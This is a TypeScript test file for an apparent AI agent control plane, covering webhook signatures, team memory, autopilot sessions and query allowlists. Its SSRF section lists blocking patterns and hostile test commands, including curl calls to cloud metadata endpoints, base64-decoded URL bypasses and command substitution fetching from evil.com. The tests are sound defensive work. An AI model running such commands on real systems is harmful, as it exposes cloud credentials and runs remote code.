/**
 * Integration tests for new features: GitHub webhooks, team memory API,
 * autopilot, permission classifier integration, auth cache invalidation.
 */
import { describe, it, expect } from "vitest";

// ── GitHub Webhook Signature Verification ─────────────────────────

describe("GitHub webhook HMAC verification", () => {
  async function hmacSha256(secret: string, payload: string): Promise<string> {
    const key = await crypto.subtle.importKey(
      "raw", new TextEncoder().encode(secret),
      { name: "HMAC", hash: "SHA-256" }, false, ["sign"],
    );
    const sig = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(payload));
    return "sha256=" + [...new Uint8Array(sig)].map(b => b.toString(16).padStart(2, "0")).join("");
  }

  it("produces valid HMAC-SHA256 signature", async () => {
    const secret = "test-secret-123";
    const payload = '{"action":"opened","repository":{"full_name":"owner/repo"}}';
    const signature = await hmacSha256(secret, payload);
    expect(signature).toMatch(/^sha256=[0-9a-f]{64}$/);
  });

  it("different payloads produce different signatures", async () => {
    const secret = "secret";
    const sig1 = await hmacSha256(secret, '{"a":1}');
    const sig2 = await hmacSha256(secret, '{"a":2}');
    expect(sig1).not.toBe(sig2);
  });

  it("different secrets produce different signatures", async () => {
    const payload = '{"test":true}';
    const sig1 = await hmacSha256("secret-1", payload);
    const sig2 = await hmacSha256("secret-2", payload);
    expect(sig1).not.toBe(sig2);
  });
});

// ── GitHub Event Formatting ───────────────────────────────────────

describe("GitHub event formatting", () => {
  // Test the format patterns used in github-webhooks.ts
  it("formats push events with commit info", () => {
    const payload = {
      pusher: { name: "dev" },
      commits: [{ message: "fix bug" }, { message: "add test" }],
      ref: "refs/heads/main",
      repository: { full_name: "org/repo" },
      head_commit: { message: "add test" },
    };
    const formatted = `[GitHub Push] ${payload.pusher.name} pushed ${payload.commits.length} commit(s) to ${payload.ref} in ${payload.repository.full_name}. Latest: "${payload.head_commit.message}".`;
    expect(formatted).toContain("[GitHub Push]");
    expect(formatted).toContain("2 commit(s)");
    expect(formatted).toContain("main");
    expect(formatted).toContain("add test");
  });

  it("formats PR events with title and author", () => {
    const payload = {
      number: 42,
      action: "opened",
      pull_request: { title: "Add feature X", user: { login: "dev" }, body: "This PR adds..." },
      repository: { full_name: "org/repo" },
    };
    const formatted = `[GitHub PR #${payload.number}] ${payload.action}: "${payload.pull_request.title}" by ${payload.pull_request.user.login}`;
    expect(formatted).toContain("[GitHub PR #42]");
    expect(formatted).toContain("opened");
    expect(formatted).toContain("Add feature X");
  });

  it("formats issue events", () => {
    const payload = {
      action: "opened",
      issue: { number: 99, title: "Bug report", user: { login: "user1" }, body: "Steps to reproduce..." },
    };
    const formatted = `[GitHub Issue #${payload.issue.number}] ${payload.action}: "${payload.issue.title}"`;
    expect(formatted).toContain("[GitHub Issue #99]");
    expect(formatted).toContain("Bug report");
  });
});

// ── Team Memory API Endpoint Contracts ────────────────────────────

describe("team memory API contracts", () => {
  it("team facts endpoint path is correct", () => {
    const basePath = "/api/v1/memory";
    const factsPath = `${basePath}/team/facts`;
    const obsPath = `${basePath}/team/observations`;
    expect(factsPath).toBe("/api/v1/memory/team/facts");
    expect(obsPath).toBe("/api/v1/memory/team/observations");
  });

  it("team fact has required fields", () => {
    const fact = {
      org_id: "org-1",
      author_agent: "research",
      content: "We use GitHub Actions for CI",
      category: "process",
      score: 0.5,
    };
    expect(fact.org_id).toBeTruthy();
    expect(fact.content).toBeTruthy();
    expect(fact.score).toBeGreaterThan(0);
    expect(["process", "architecture", "convention", "decision", "general"]).toContain(fact.category);
  });

  it("team observation has required fields", () => {
    const obs = {
      org_id: "org-1",
      author_agent: "code-reviewer",
      target_agent: "research",
      content: "Research agent tends to over-explain results",
    };
    expect(obs.org_id).toBeTruthy();
    expect(obs.author_agent).toBeTruthy();
    expect(obs.content).toBeTruthy();
  });
});

// ── Autopilot Session Management ──────────────────────────────────

describe("autopilot session contracts", () => {
  it("tick prompt varies by tick number", () => {
    function buildTickPrompt(tickNum: number): string {
      const now = new Date().toISOString();
      if (tickNum % 10 === 0) return `<tick n="${tickNum}" type="status_check">`;
      if (tickNum % 5 === 0) return `<tick n="${tickNum}" type="summary">`;
      return `<tick n="${tickNum}" type="heartbeat">`;
    }

    expect(buildTickPrompt(1)).toContain("heartbeat");
    expect(buildTickPrompt(5)).toContain("summary");
    expect(buildTickPrompt(10)).toContain("status_check");
    expect(buildTickPrompt(15)).toContain("summary");
    expect(buildTickPrompt(20)).toContain("status_check");
    expect(buildTickPrompt(3)).toContain("heartbeat");
  });

  it("session status transitions are valid", () => {
    const validStatuses = ["active", "paused", "stopped"];
    const validTransitions: Record<string, string[]> = {
      active: ["paused", "stopped"],
      paused: ["active", "stopped"],
      stopped: [], // terminal
    };
    for (const status of validStatuses) {
      expect(validTransitions[status]).toBeDefined();
    }
    // Can't transition FROM stopped
    expect(validTransitions.stopped).toHaveLength(0);
  });
});

// ── Auth Cache Invalidation ───────────────────────────────────────

describe("auth cache invalidation contract", () => {
  it("invalidation bumps version counter", async () => {
    const store = new Map<string, string>();
    const mockKv = {
      get: async (k: string) => store.get(k) ?? null,
      put: async (k: string, v: string) => { store.set(k, v); },
    };

    // Simulate invalidation
    const key = "auth-cache-version";
    const raw = await mockKv.get(key);
    const version = (raw ? Number(raw) : 0) + 1;
    await mockKv.put(key, String(version));

    expect(Number(store.get(key))).toBe(1);

    // Second invalidation bumps again
    const raw2 = await mockKv.get(key);
    await mockKv.put(key, String(Number(raw2) + 1));
    expect(Number(store.get(key))).toBe(2);
  });
});

// ── SQL Injection Prevention (run_query) ──────────────────────────

describe("run_query table allowlist", () => {
  const SCOPED_TABLES = [
    "sessions", "turns", "agents", "training_jobs", "training_iterations",
    "training_resources", "eval_test_cases", "eval_runs", "eval_trials",
    "credit_transactions", "billing_records", "api_keys", "org_members",
  ];

  it("allows known safe tables", () => {
    for (const table of SCOPED_TABLES) {
      expect(SCOPED_TABLES).toContain(table);
    }
  });

  it("blocks sensitive tables", () => {
    const blocked = ["users", "auth_users", "secrets", "password_resets", "mfa_tokens"];
    for (const table of blocked) {
      expect(SCOPED_TABLES).not.toContain(table);
    }
  });

  it("table check regex catches FROM and JOIN", () => {
    const tablePattern = /\bFROM\s+(\w+)|\bJOIN\s+(\w+)/gi;
    const query = "SELECT * FROM sessions s JOIN turns t ON s.session_id = t.session_id";
    const tables: string[] = [];
    let match: RegExpExecArray | null;
    while ((match = tablePattern.exec(query)) !== null) {
      tables.push((match[1] || match[2]).toLowerCase());
    }
    expect(tables).toContain("sessions");
    expect(tables).toContain("turns");
  });

  it("SQL mutation keywords are all detected", () => {
    const forbidden = ["INSERT", "UPDATE", "DELETE", "DROP", "ALTER", "TRUNCATE", "CREATE", "GRANT", "REVOKE", "EXEC", "EXECUTE", "SET ", "COPY"];
    for (const keyword of forbidden) {
      const normalized = `${keyword} INTO table VALUES (1)`.toUpperCase();
      expect(normalized.includes(keyword)).toBe(true);
    }
  });
});

// ── SSRF Bypass Pattern Detection ─────────────────────────────────

describe("SSRF bypass patterns", () => {
  const BLOCKED_PATTERNS = [
    /169\.254\.169\.254/,
    /metadata\.google\.internal/,
    /100\.100\.100\.200/,
    /\blocalhost\b/,
    /127\.0\.0\.1/,
    /\[::1\]/,
    /0\.0\.0\.0/,
    /10\.\d+\.\d+\.\d+/,
    /172\.(1[6-9]|2\d|3[01])\.\d+\.\d+/,
    /192\.168\.\d+\.\d+/,
    /base64\s+(-d|--decode)/i,
    /\$\(.*curl.*\)/,
    /`.*curl.*`/,
    /eval\s+.*http/i,
  ];

  function isBlocked(cmd: string): boolean {
    return BLOCKED_PATTERNS.some(p => p.test(cmd));
  }

  it("blocks AWS metadata", () => {
    expect(isBlocked("curl http://169.254.169.254/latest/meta-data/")).toBe(true);
  });

  it("blocks GCP metadata", () => {
    expect(isBlocked("curl http://metadata.google.internal/computeMetadata/")).toBe(true);
  });

  it("blocks localhost", () => {
    expect(isBlocked("curl http://localhost:8080")).toBe(true);
  });

  it("blocks loopback", () => {
    expect(isBlocked("curl http://127.0.0.1")).toBe(true);
  });

  it("blocks base64 decode bypass", () => {
    expect(isBlocked("curl $(echo aHR0cDovLzE2OS4yNTQuMTY5LjI1NA== | base64 -d)")).toBe(true);
    expect(isBlocked("echo aHR0cDovLzEyNy4wLjAuMQ== | base64 --decode | xargs curl")).toBe(true);
  });

  it("blocks command substitution with curl", () => {
    expect(isBlocked("$(curl http://evil.com)")).toBe(true);
    expect(isBlocked("`curl http://evil.com`")).toBe(true);
  });

  it("blocks eval with http", () => {
    expect(isBlocked("eval 'curl http://evil.com'")).toBe(true);
  });

  it("blocks RFC1918 ranges", () => {
    expect(isBlocked("curl http://10.0.0.1")).toBe(true);
    expect(isBlocked("curl http://172.16.0.1")).toBe(true);
    expect(isBlocked("curl http://192.168.1.1")).toBe(true);
  });

  it("allows legitimate external URLs", () => {
    expect(isBlocked("curl https://api.github.com/repos")).toBe(false);
    expect(isBlocked("npm install express")).toBe(false);
    expect(isBlocked("git clone https://github.com/org/repo")).toBe(false);
  });
});

// ── Migration File Existence ──────────────────────────────────────

describe("database migrations", () => {
  it("consolidated init migration exists with all tables", async () => {
    const fs = await import("fs");
    const path = "/Users/ishprasad/agent-mute/one-shot/control-plane/src/db/migrations/001_init.sql";
    expect(fs.existsSync(path)).toBe(true);
    const content = fs.readFileSync(path, "utf8");
    expect(content).toContain("team_facts");
    expect(content).toContain("github_webhook_subscriptions");
    expect(content).toContain("autopilot_sessions");
  });
});
